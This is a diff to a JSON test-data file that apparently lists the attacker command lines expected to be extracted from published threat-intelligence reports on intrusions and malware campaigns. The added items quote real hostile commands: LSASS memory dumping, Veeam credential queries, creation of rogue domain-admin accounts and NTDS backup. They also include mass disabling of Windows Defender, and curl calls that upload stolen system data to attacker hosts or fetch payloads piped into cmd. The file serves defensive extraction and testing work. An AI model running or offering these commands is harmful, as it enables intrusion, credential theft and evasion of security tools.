@@ -39,7 +39,6 @@
       "dir /s /b C:\\Windows\\system32\\*htable.xsl",
       "net group \"domain Admins\" /domain",
       "mkdir \"C:\\ProgramData\\Any\"",
-      "C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent",
       "echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password"
     ]
   },
@@ -51,7 +50,8 @@
       "nltest /domain_trusts /all_trusts",
       "nltest /dclist:",
       "net group \"Domain Admins\" /domain",
-      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED"
+      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED",
+      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1   \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\"
     ]
   },
   {
@@ -64,12 +64,21 @@
       "psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\"",
       "for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %%B \\Windows\\Temp\\*.* full",
       "net user backup_EA P@ssw0rd1234 /add /dom",
-      "net group \"enterprise admins\" backup_EA /add /dom"
+      "net group \"enterprise admins\" backup_EA /add /dom",
+      "nltest.exe /dclist:",
+      "nltest.exe /domain_trusts",
+      "whoami.exe /groups",
+      "net.exe group \"domain admins\" /dom",
+      "net.exe group \"enterprise admins\" /dom",
+      "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet"
     ]
   },
   {
     "url": "https://www.elastic.co/security-labs/roningloader",
-    "expected_items": []
+    "expected_items": [
+      "mklink /D \"C:\\ProgramData\\roming\" \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\"",
+      "regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll"
+    ]
   },
   {
     "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
@@ -85,13 +94,14 @@
       "schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"",
       "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
       "schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"",
-      "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q"
+      "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q",
+      "net user <redacted> \"<password redacted>\" /add",
+      "echo <redacted> | c:\\TeamCity\\bin\\anydesk.exe --set-password"
     ]
   },
   {
     "url": "https://www.fortinet.com/blog/threat-research/unveiling-a-new-variant-of-the-darkcloud-campaign",
     "expected_items": [
-      "powershell -w hidden -noprofile -ep bypass -c",
       "copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js"
     ]
   },
@@ -119,11 +129,77 @@
       "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
       "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
       "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable",
-      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable"
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable",
+      "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /d \"0\"",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f",
+      "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v \"Windows Defender\" /f",
+      "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsDefender\" /f",
+      "sc stop windefend",
+      "sc delete windefend",
+      "sc stop Sense",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc stop WdBoot",
+      "sc delete WdBoot",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc delete WdFilter",
+      "sc stop WdFilter",
+      "sc stop WdFiltrer",
+      "sc delete WdFiltrer",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc stop WdNisDrv",
+      "sc delete WdNisDrv",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc stop WdNisSvc",
+      "sc delete WdNisSvc",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc stop SecurityHealthService",
+      "sc delete SecurityHealthService",
+      "sc stop wscsvc",
+      "sc delete wscsvc",
+      "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /f",
+      "sc stop SgrmAgent",
+      "sc stop SgrmBroker"
     ]
   },
   {
     "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
-    "expected_items": []
+    "expected_items": [
+      "dir > abc1.pdf",
+      "tasklist >> abc1.pdf",
+      "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf",
+      "wmic logicaldisk get caption >> abc1.pdf",
+      "systeminfo >> C:\\programdata\\abc1.pdf",
+      "copy /b sh1.txt+sh2.txt shh.exe",
+      "ren dune64.log dune64.bin",
+      "shh.exe dune64.bin",
+      "net use Z: \\\\72.18.215[.]1\\tempy",
+      "Z:\\shl.exe dune64.bin C:",
+      "net use /delete Z: /y",
+      "tree \"%userprofile%\\Desktop\" /f > C:\\Users\\Public\\Documents\\d.log",
+      "systeminfo >> C:\\Users\\Public\\Documents\\d.log",
+      "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List >> C:\\Users\\Public\\Documents\\d.log",
+      "wmic logicaldisk get name >> C:\\Users\\Public\\Documents\\d.log",
+      "curl -X POST -F \"file=@d.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername%",
+      "curl -o C:\\ProgramData\\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar",
+      "tar -xvf msuitl.tar",
+      "dir > t0.log",
+      "msuitl.exe tasklist >> t0.log",
+      "curl -X POST -F \"file=@t0.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%username%",
+      "curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%",
+      "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt",
+      "curl -o dune64.log http://173.254.204[.]72/dune64.log",
+      "del abc1.pdf",
+      "del d.log",
+      "del t0.log",
+      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"EdgeTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"woodstocktutors[.]com/jbc.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\Users\\public\\kwe.cc\"; Get-Content \"C:\\Users\\public\\kwe.cc\" | cmd\"",
+      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"MSTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"utizviewstation[.]com/sdf.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\Users\\public\\documents\\vfc.cc\"; Get-Content \"C:\\Users\\public\\documents\\vfc.cc\" | cmd\"",
+      "schtasks /create /tn \\\"Task-S-1-5-42121\\\" /f /sc minute /mo 18 /tr \\\"conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\\\"",
+      "\"C:\\Windows\\System32\\cmd.exe\" /start min /c schtasks /create /tn \"OneDrive\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379\" /f /sc minute /mo 19 /tr \"conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d\"& msg * \"ERROR 0XA008CE : ERROR reading File, contents are corrupted.\""
+    ]
   }
 ]
